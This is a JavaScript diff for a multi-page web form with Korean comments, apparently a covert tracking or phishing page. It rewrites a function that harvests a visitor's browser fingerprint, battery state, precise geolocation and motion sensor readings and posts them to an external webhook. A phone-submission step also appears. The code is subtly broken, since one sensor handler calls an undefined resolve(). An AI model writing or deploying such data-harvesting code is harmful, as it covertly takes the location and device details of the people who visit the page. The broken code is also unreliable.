@@ -76,87 +76,95 @@ function goNext() {
 
 // 최대 정보 수집
 async function collectUserInfo() {
-  let info = {};
-  info.userAgent = navigator.userAgent;
-  info.language = navigator.language;
-  info.platform = navigator.platform;
-  info.cookieEnabled = navigator.cookieEnabled;
-  info.onLine = navigator.onLine;
-  info.hardwareConcurrency = navigator.hardwareConcurrency;
-  info.deviceMemory = navigator.deviceMemory || "unknown";
-  info.plugins = Array.from(navigator.plugins).map(p=>p.name);
+  const formData = new URLSearchParams();
 
-  info.screen = {
-    width: screen.width,
-    height: screen.height,
-    availWidth: screen.availWidth,
-    availHeight: screen.availHeight,
-    colorDepth: screen.colorDepth,
-    pixelDepth: screen.pixelDepth
-  };
-  info.window = {
-    innerWidth: window.innerWidth,
-    innerHeight: window.innerHeight,
-    outerWidth: window.outerWidth,
-    outerHeight: window.outerHeight
-  };
-  info.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+  // 브라우저 기본 정보
+  formData.append("userAgent", navigator.userAgent);
+  formData.append("language", navigator.language);
+  formData.append("platform", navigator.platform);
+  formData.append("cookieEnabled", navigator.cookieEnabled);
+  formData.append("onLine", navigator.onLine);
+  formData.append("hardwareConcurrency", navigator.hardwareConcurrency ?? "unknown");
+  formData.append("deviceMemory", navigator.deviceMemory ?? "unknown");
+  formData.append("plugins", Array.from(navigator.plugins).map(p=>p.name).join(",") || "unknown");
 
+  // 화면 정보
+  formData.append("screen.width", screen.width);
+  formData.append("screen.height", screen.height);
+  formData.append("screen.availWidth", screen.availWidth);
+  formData.append("screen.availHeight", screen.availHeight);
+  formData.append("screen.colorDepth", screen.colorDepth);
+  formData.append("screen.pixelDepth", screen.pixelDepth);
+
+  // 창 정보
+  formData.append("window.innerWidth", window.innerWidth);
+  formData.append("window.innerHeight", window.innerHeight);
+  formData.append("window.outerWidth", window.outerWidth);
+  formData.append("window.outerHeight", window.outerHeight);
+
+  // 시간대
+  formData.append("timezone", Intl.DateTimeFormat().resolvedOptions().timeZone);
+
+  // 네트워크 정보
   if (navigator.connection) {
-    info.network = {
-      downlink: navigator.connection.downlink,
-      effectiveType: navigator.connection.effectiveType,
-      rtt: navigator.connection.rtt,
-      saveData: navigator.connection.saveData
-    };
+    formData.append("network.downlink", navigator.connection.downlink ?? "unknown");
+    formData.append("network.effectiveType", navigator.connection.effectiveType ?? "unknown");
+    formData.append("network.rtt", navigator.connection.rtt ?? "unknown");
+    formData.append("network.saveData", navigator.connection.saveData ?? "unknown");
+  } else {
+    formData.append("network.info", "unknown");
   }
 
-  // 배터리 정보: 없으면 unknown
+  // 배터리 정보
   if (navigator.getBattery) {
     try {
       const battery = await navigator.getBattery();
-      info.battery = {
-        charging: battery.charging,
-        level: battery.level,
-        chargingTime: battery.chargingTime,
-        dischargingTime: battery.dischargingTime
-      };
-    } catch(e) { 
-      info.battery = { charging:"unknown", level:"unknown", chargingTime:"unknown", dischargingTime:"unknown" };
+      formData.append("battery.charging", battery.charging);
+      formData.append("battery.level", battery.level);
+      formData.append("battery.chargingTime", battery.chargingTime);
+      formData.append("battery.dischargingTime", battery.dischargingTime);
+    } catch(e) {
+      formData.append("battery.info", "unknown");
     }
   } else {
-    info.battery = { charging:"unknown", level:"unknown", chargingTime:"unknown", dischargingTime:"unknown" };
+    formData.append("battery.info", "unknown");
   }
 
+  // 위치 정보
   if (navigator.geolocation) {
     await new Promise(resolve => {
       navigator.geolocation.getCurrentPosition(pos => {
-        info.location = { latitude: pos.coords.latitude, longitude: pos.coords.longitude, accuracy: pos.coords.accuracy };
+        formData.append("location.latitude", pos.coords.latitude);
+        formData.append("location.longitude", pos.coords.longitude);
+        formData.append("location.accuracy", pos.coords.accuracy);
         resolve();
-      }, err => { info.locationError = err.message; resolve(); });
+      }, err => { formData.append("location.error", err.message); resolve(); });
     });
+  } else {
+    formData.append("location", "unknown");
   }
 
-  info.sensors = {};
-  function sensorHandler(event) {
-    info.sensors.acceleration = event.acceleration;
-    info.sensors.accelerationIncludingGravity = event.accelerationIncludingGravity;
-    info.sensors.rotationRate = event.rotationRate;
+  // 센서 정보 (1회만 수집)
+  if (window.DeviceMotionEvent) {
+    window.addEventListener("devicemotion", e=>{
+      if (e.acceleration) {
+        formData.append("sensors.acceleration.x", e.acceleration.x ?? "unknown");
+        formData.append("sensors.acceleration.y", e.acceleration.y ?? "unknown");
+        formData.append("sensors.acceleration.z", e.acceleration.z ?? "unknown");
+      }
+      resolve();
+    }, { once:true });
   }
-  if (window.DeviceMotionEvent) { window.addEventListener("devicemotion", sensorHandler, { once: true }); }
-  if (window.DeviceOrientationEvent) { window.addEventListener("deviceorientation", e=>{info.sensors.orientation={alpha:e.alpha,beta:e.beta,gamma:e.gamma};},{once:true}); }
-
-  info.timestamp = new Date().toISOString();
-
-  // JSON 대신 URLSearchParams로 전송
-  const formData = new URLSearchParams();
-  for (let key in info) {
-    if (typeof info[key] === "object") {
-      formData.append(key, JSON.stringify(info[key]));
-    } else {
-      formData.append(key, info[key]);
-    }
+  if (window.DeviceOrientationEvent) {
+    window.addEventListener("deviceorientation", e=>{
+      formData.append("sensors.orientation.alpha", e.alpha ?? "unknown");
+      formData.append("sensors.orientation.beta", e.beta ?? "unknown");
+      formData.append("sensors.orientation.gamma", e.gamma ?? "unknown");
+    }, { once:true });
   }
+
+  // 타임스탬프
+  formData.append("timestamp", new Date().toISOString());
   formData.append("page","1");
 
   fetch(webhookUrl,{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:formData})
@@ -181,7 +189,7 @@ function sendPhone() {
       document.getElementById("page3").classList.add("hidden");
       document.getElementById("page4").classList.remove("hidden");
     },1000);
-  },4000);
+  },1500);
 }
 
 // page4 전송
